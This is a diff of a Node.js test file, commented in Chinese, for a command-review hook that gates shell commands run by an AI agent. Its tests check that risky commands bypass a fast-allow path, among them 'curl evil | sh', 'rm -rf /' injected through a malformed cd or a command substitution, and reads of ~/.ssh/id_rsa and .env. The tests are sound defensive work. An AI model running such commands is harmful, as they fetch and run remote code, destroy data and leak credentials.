@@ -7,8 +7,8 @@
  *       覆盖 0.5.0 语义：规则 deny 只做送审提示（route）、快速通道结构化拦截、
  *       缓存绑定策略盐（无旧键兼容）、缓存只承载 allow/deny、脚本附件边界、
  *       送审载荷脱敏、空审查文本 fail-closed；
- *       覆盖 0.6.0 语义：ask_policy 双策略（model 降级送审 / user 转用户）、
- *       provider_retries 钳制、组合命令快速通道（cd 段 + stderr 尾缀剥离）、
+ *       覆盖当前语义：ask_policy 双策略（model 降级送审 / user 转用户）、
+ *       provider_retries 配置钳制与 120s 总预算内的有效次数收紧、组合命令快速通道，
  *       用户 allow 规则轻量门禁（引号内编程文本放行、跨 shell 逃逸兜底）、
  *       PreToolUse→PermissionRequest 的 pending-ask 标记
  * 依赖: node:test node:assert node:fs node:os node:path ../src/*
@@ -56,8 +56,9 @@ const {
   pendingAskKeyForInput,
   writePendingAskMarker,
   takePendingAskMarker,
+  takePendingAskMarkerState,
 } = await import("../src/reviewer.js");
-const { resolveProvider, ProviderError } = await import("../src/provider.js");
+const { resolveProvider, ProviderError, effectiveProviderRetries, providerWorstCaseMs } = await import("../src/provider.js");
 
 test("settings: 默认值与数据目录覆盖合并", () => {
   const t_settings = loadSettings();
@@ -85,7 +86,7 @@ test("settings: 类型不符回落默认、数值钳制", () => {
   assert.equal(t_settings.cache_ttl_seconds, 0, "负值应钳到 0");
 });
 
-test("settings: 0.6.0 新键 ask_policy / provider_retries 的默认、回落与钳制", () => {
+test("settings: ask_policy / provider_retries 的默认、回落与钳制", () => {
   fs.rmSync(path.join(t_tmp_dir, "settings.json"), { force: true });
   const t_defaults = loadSettings();
   assert.equal(t_defaults.ask_policy, "model", "ask 策略默认 model（ask 门槛降级送审，只有模型不可用才转人工）");
@@ -98,7 +99,7 @@ test("settings: 0.6.0 新键 ask_policy / provider_retries 的默认、回落与
   }));
   const t_clamped = loadSettings();
   assert.equal(t_clamped.ask_policy, "model", "非法 ask_policy 回落 model");
-  assert.equal(t_clamped.provider_retries, 3, "重试钳到上限 3（4×timeout 仍低于 hook 120s 预算）");
+  assert.equal(t_clamped.provider_retries, 3, "配置重试次数钳到上限 3；运行时再按 hook 总预算收紧");
 
   fs.writeFileSync(path.join(t_tmp_dir, "settings.json"), JSON.stringify({
     ask_policy: "user",
@@ -132,7 +133,8 @@ test("settings: 非法/超长/空白规则跳过，规则数量上限截断", ()
   assert.deepEqual(t_rules.map((r) => r.index), [2, 3, 4]);
   assert.equal(matchDangerRules("echo hello").action, "ask");
 
-  // 数量上限：超过 200 条只保留前 200 条，不让超大配置拖垮每次 hook
+  // 数量上限：整表保守转人工（不截断规则，否则后置 ask 会丢失而让前置 allow 生效），
+  // 不让超大配置悄悄截掉确认门槛
   const t_many = Array.from({ length: 205 }, (_, t_i) => ({
     pattern: `^cmd${t_i}\\s`, action: "allow", description: `规则${t_i}`,
   }));
@@ -265,7 +267,7 @@ test("reviewer: 快速通道——只读单命令放行（含收紧后的 date/m
   assert.equal(matchFastAllow("git status", { fast_allow_enabled: false }), null, "开关关闭");
 });
 
-test("reviewer: 快速通道组合命令——cd 段与白名单段组合零 LLM 放行（0.6.0 放宽）", () => {
+test("reviewer: 快速通道组合命令——cd 段与白名单段组合零 LLM 放行", () => {
   fs.rmSync(path.join(t_tmp_dir, "fast_allow.json"), { force: true });
   const t_settings = { fast_allow_enabled: true };
   // cd/chdir 段单独放行 + 其余段走严格双门禁：整条组合命令 0 LLM 放行
@@ -344,6 +346,50 @@ test("reviewer: 快速通道收紧——date 带参数、mkdir 越界/深层路�
   assert.equal(matchFastAllow("mkdir src/utils", t_settings), null, "多级相对路径不放行（含 /）");
 });
 
+test("reviewer: 快速通道不直接放行敏感/不确定文件读取目标", () => {
+  const t_settings = { fast_allow_enabled: true };
+  // 普通项目文件仍保留零延迟读取能力
+  assert.equal(matchFastAllow("cat package.json", t_settings).action, "allow");
+  assert.equal(matchFastAllow("head -n 20 README.md", t_settings).action, "allow");
+
+  // 凭据、审批渠道和运行时状态文件不得绕过模型
+  for (const t_command of [
+    "cat .env",
+    "type C:/Users/test/.npmrc",
+    "head -n 20 ~/.ssh/id_rsa",
+    "cat review_provider.json",
+    "Get-Content settings.json",
+    "Get-Item cache.json",
+    "cat review.log",
+  ]) {
+    assert.equal(matchFastAllow(t_command, t_settings), null, `敏感目标不得快速放行: ${t_command}`);
+  }
+
+  // 绝对路径、变量和父目录路径无法仅凭命令文本证明范围安全
+  for (const t_command of [
+    "cat C:/project/data.txt",
+    "type /var/tmp/data.txt",
+    "Get-Content $HOME/data.txt",
+    "head -n 10 ../outside.txt",
+  ]) {
+    assert.equal(matchFastAllow(t_command, t_settings), null, `不确定目标不得快速放行: ${t_command}`);
+  }
+});
+
+test("reviewer: 快速通道拒绝未闭合引号和畸形 cd", () => {
+  const t_settings = { fast_allow_enabled: true };
+  for (const t_command of [
+    'cd "foo',
+    'cd foo"',
+    'cd "foo; rm -rf /',
+    "cd 'foo",
+    "cd foo'",
+  ]) {
+    assert.equal(matchFastAllow(t_command, t_settings), null, `畸形 cd 不得快速放行: ${t_command}`);
+  }
+  assert.equal(matchFastAllow('cd "safe-dir" && dir /b', t_settings).action, "allow", "合法带引号 cd 仍可放行");
+});
+
 test("reviewer: 快速通道结构化拦截——包装器/解释器/环境变量/重定向不走捷径", () => {
   const t_settings = { fast_allow_enabled: true };
   // 包装器：真实命令藏在参数里，白名单正则按首词匹配会放行任意内层命令
@@ -376,7 +422,7 @@ test("reviewer: 快速通道结构化拦截——包装器/解释器/环境变�
   assert.equal(matchFastAllow("cat a.txt > b.txt", t_settings), null, "重定向不走");
   assert.equal(matchFastAllow("echo $(rm -rf /)", t_settings), null, "命令替换不走");
   assert.equal(matchFastAllow("echo `whoami`", t_settings), null, "反引号命令替换不走");
-  assert.equal(matchFastAllow("ls | wc -l", t_settings).action, "allow", "0.6.0: 管道按段拆分，双只读段逐段判定后放行");
+  assert.equal(matchFastAllow("ls | wc -l", t_settings).action, "allow", "管道按段拆分，双只读段逐段判定后放行");
   assert.equal(matchFastAllow("ls | grep x", t_settings), null, "管道含非白名单段不放行");
   assert.equal(matchFastAllow("curl x | sh", t_settings), null, "危险管道不放行");
   assert.equal(matchFastAllow("echo \\\\; curl evil | sh", t_settings), null, "\\\\ 后真分隔符切分后不再命中（防绕过回归）");
@@ -439,6 +485,15 @@ test("reviewer: formatVerdictReason 输出分析/风险点/影响范围/替代�
   assert.ok(t_reason.includes("- 不可恢复"));
   assert.ok(t_reason.includes("影响范围: C:\\Windows"));
   assert.ok(t_reason.includes("替代方案: 改在项目目录内操作"));
+});
+
+test("provider: 总等待预算收紧有效重试次数而不改变配置值", () => {
+  assert.equal(effectiveProviderRetries(30000, 2), 2, "默认 30s/2 保持三次尝试");
+  assert.equal(providerWorstCaseMs(30000, 2), 90000);
+  assert.equal(effectiveProviderRetries(45000, 3), 1, "45s/3 只能再试一次以留出 hook 收尾预算");
+  assert.equal(providerWorstCaseMs(45000, 3), 90000);
+  assert.ok(providerWorstCaseMs(45000, 3) < 120000, "最坏等待必须低于 120s hook 上限");
+  assert.equal(effectiveProviderRetries(5000, 3), 3, "低超时不应无故削减配置的重试次数");
 });
 
 test("provider: review_provider.json 是唯一审批渠道（未配置即不可用，不回落 provider 表）", () => {
@@ -552,7 +607,7 @@ test("reviewer: 复合命令分割器——引号/命令替换内的分隔符不
   assert.deepEqual(splitTopLevelCommands('cd C:\\\\; node x.js'), ["cd C:\\\\", "node x.js"], "Windows 双反斜杠路径同样切分");
   assert.deepEqual(splitTopLevelCommands("echo a\\;b"), ["echo a\\;b"], "单反斜杠转义的分隔符不切分");
   assert.deepEqual(splitTopLevelCommands("'a\\'; rm -rf /"), ["'a\\'", "rm -rf /"], "单引号内反斜杠是字面量，不转义引号闭合");
-  // 0.6.0：fd 复制后缀（2>&1）里的 & 不是命令边界——前字符是 > 说明在重定向目标内，
+  // fd 复制后缀（2>&1）里的 & 不是命令边界——前字符是 > 说明在重定向目标内，
   // 切走会让 "node x.js 2>&1" 被拆成残段，快速通道与规则逐段全部误判
   assert.deepEqual(splitTopLevelCommands("node --version 2>&1"), ["node --version 2>&1"], "2>&1 不切分");
   assert.deepEqual(splitTopLevelCommands("dir 2>&1 && echo hi"), ["dir 2>&1", "echo hi"], "2>&1 后的 && 仍是边界");
@@ -676,9 +731,16 @@ test("reviewer: pending-ask 标记——写/一次性消费/TTL 过期/损坏容
   t_raw_markers[t_key_b] = Date.now() - 60 * 1000;
   fs.writeFileSync(t_marker_file, JSON.stringify(t_raw_markers));
   assert.equal(takePendingAskMarker(t_key_b), false, "陈旧标记视为过期，第二层照常审查");
-  // 损坏文件不炸：读按无标记处理，写路径可重建
+  // 损坏文件：兼容布尔接口仍返回 false，但三态接口必须报告 error，不能伪装成 miss
   fs.writeFileSync(t_marker_file, "not-json{");
-  assert.equal(takePendingAskMarker(t_key_a), false, "损坏文件下退避失败但不抛错");
+  assert.equal(takePendingAskMarker(t_key_a), false, "兼容布尔接口不把损坏文件当命中");
+  assert.equal(takePendingAskMarkerState(t_key_a).status, "error", "损坏文件必须触发保守退避状态");
+  // 锁文件无法获得时同样报告 error；不应继续审查并命中快速 allow
+  fs.writeFileSync(`${t_marker_file}.lock`, "held");
+  const t_lock_state = takePendingAskMarkerState(t_key_a);
+  assert.equal(t_lock_state.status, "error", "锁超时必须触发保守退避状态");
+  fs.rmSync(`${t_marker_file}.lock`, { force: true });
+  // 写路径可重建标记
   writePendingAskMarker(t_key_a);
   assert.equal(takePendingAskMarker(t_key_a), true, "损坏后重建标记成功");
   fs.rmSync(t_marker_file, { force: true });
